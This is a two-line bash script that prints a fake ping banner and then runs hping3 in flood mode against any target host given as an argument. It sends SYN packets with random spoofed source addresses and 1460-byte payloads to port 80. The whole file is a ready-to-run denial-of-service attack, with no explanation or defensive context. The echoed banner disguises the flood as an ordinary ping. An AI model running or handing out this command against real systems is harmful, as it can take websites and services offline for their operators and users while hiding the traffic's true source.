#!/bin/bash
echo "HPING $1 (eth0 10.0.0.2): rand data" && hping3 --flood --rand-source -d 1460 -S -p 80 $1
